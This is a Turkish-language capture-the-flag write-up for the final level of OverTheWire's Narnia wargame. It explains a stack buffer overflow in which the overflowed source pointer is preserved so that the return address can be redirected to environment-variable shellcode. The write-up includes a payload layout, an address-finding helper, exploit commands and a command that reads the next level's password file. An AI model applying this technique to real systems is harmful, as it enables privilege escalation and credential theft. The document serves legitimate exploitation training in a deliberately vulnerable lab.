# OverTheWire — Narnia Level 8 → 9  [SON SEVİYE]

> Hedef: `narnia8`'den `narnia9` şifresi. Sonuç: **`**********`** (gizlendi) — **Narnia bitti!**
> Teknik: **self-referential pointer** overflow — kaynak pointer `blah`'ı bozmadan tutarak
> return adresini env-shellcode'a yönlendirme.

---

## 1. Bağlantı
```bash
ssh narnia8@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak
```c
int i;                       // GLOBAL (stack'te değil — "morla" notu: reordering fix)
void func(char *b){
    char *blah = b;          // blah = argv[1]
    char bok[20];
    memset(bok, 0, sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)
        bok[i] = blah[i];    // kaynak blah[i]; blah'ın KENDİSİ bok'a komşu!
    printf("%s\n", bok);
}
```

## 3. Disasm — düzen
```
8049179:  sub  esp, 0x18
804917f:  mov  [ebp-0x4], eax        ; blah = b   ->  blah @ ebp-0x4
8049186:  lea  eax, [ebp-0x18]       ; bok  @ ebp-0x18 (20 byte)
...
80491b2:  mov  [ebp+eax*1-0x18], dl  ; bok[i] = blah[i]   (eax = global i)
```
Düzen (alçak→yüksek): `bok[20] (ebp-0x18)` · **`blah ptr (ebp-0x4)`** · saved ebp (ebp) · saved eip (ebp+4).

`bok[i] = *(ebp+i-0x18)` indeks → adres eşlemesi:
| i | yazılan yer |
|---|-------------|
| 0..19 | bok |
| 20..23 | **blah** (pointer) |
| 24..27 | saved ebp |
| 28..31 | **saved eip** |

## 4. Twist
`i=20`'de `bok[20] = blah[20]` → **`blah`'ın kendi baytını ezer** → kaynak adres kayar →
sonraki `blah[i]` okumaları bambaşka yerden gelir. Naif overflow çöker:
```bash
./narnia8 $(python3 -c 'print("A"*20)')   # OK
./narnia8 $(python3 -c 'print("A"*21)')   # Segmentation fault (21. byte blah'ı bozdu)
```

## 5. KİLİT FİKİR — `blah`'ı `B0`'da sabit tut
`argv1[20..23]`'ü `blah`'ın **orijinal değeri** (`B0 = &argv1[0]`) yaparsam:
- i=20..23'te `*(B0+20..23) = argv1[20..23] = B0` → blah'a **kendi değeri** yazılır → blah **değişmez**.
- Böylece `bok[i] = *(B0+i) = argv1[i]` (her i için) → kopya düz **memcpy** olur.
- O zaman `argv1[28..31]` = saved eip = **shellcode adresi**.

```
argv1 = "A"*20 + pack(B0) + "BBBB" + pack(SHELLCODE_ADDR)     # 32 byte, sonra NULL -> loop durur
        └─ bok ─┘ └blah=B0┘ └s.ebp┘ └─ saved eip ─┘
```
> Tüm 32 bayt **null-free** olmalı (argv string null'da kesilir → B0/ADDR baytlarını kontrol et).
> Bu sayede **gdb deneme-yanılması GEREKMEZ** — deterministik, tek seferde.

## 6. Adresler (helper, ASLR kapalı)
`B0` (= &argv1) ve EGG adresini tek helper ile bul (15-char path, 32-byte argv[1], EGG export):
```c
int main(int c,char**v){ printf("B0=%p EGG=%p\n", v[1], getenv("EGG")); return 0; }
```
`SHELLCODE_ADDR = EGG_addr + 10000` (20000'lik NOP sled ortası).

## 7. Exploit
```bash
cd /tmp
export EGG=$(python3 -c 'b"\x90"*20000 + SHELLCODE_57')           # setreuid+execve
INFO=$(/tmp/b0finder12 "$(python3 -c 'b"A"*32')")                 # B0 + EGG addr
# canlı: B0=ffff8758  EGGA=ffff8f9e  ADDR(=EGGA+10000)=ffffb6ae
ARG1 = b"A"*20 + pack(B0) + b"BBBB" + pack(EGG_addr+10000)
# env silinmiyor -> cat çalışır; timed feed
python3 -c 'timed: "id; cat /etc/narnia_pass/narnia9"' | /narnia/narnia8 "$ARG1"
```
Çıktı: `uid=14009(narnia9)` → şifre. (Deneme-yanılma OLMADAN ilk seferde.)

## 8. Doğrulama
`ssh narnia9@... -p 2226` → `uid=14009(narnia9)` ✅
`/narnia/` altında narnia9 binary'si YOK → **narnia9 son seviye, Narnia tamamlandı.**

## Dersler
| Konu | Not |
|------|-----|
| self-referential ptr | kaynak `blah` hedef `bok`'a komşu → kopya ortasında kaynak kayar (hem tuzak hem primitive) |
| blah'ı koru | `argv1[20..23]=B0` → blah kendine eşit yazılır, değişmez → düz memcpy |
| deterministik çözüm | gdb deneme-yanılması yerine "blah=B0" → tek seferde |
| null-free | argv string null içeremez (B0/ADDR baytlarını kontrol et) |
| indeks tablosu | `bok[i]→ebp+i-0x18`: 20-23 blah, 24-27 s.ebp, **28-31 saved eip** |

**narnia9 şifresi: `**********`** — 🎉 **Narnia 0→9 tamamlandı.**
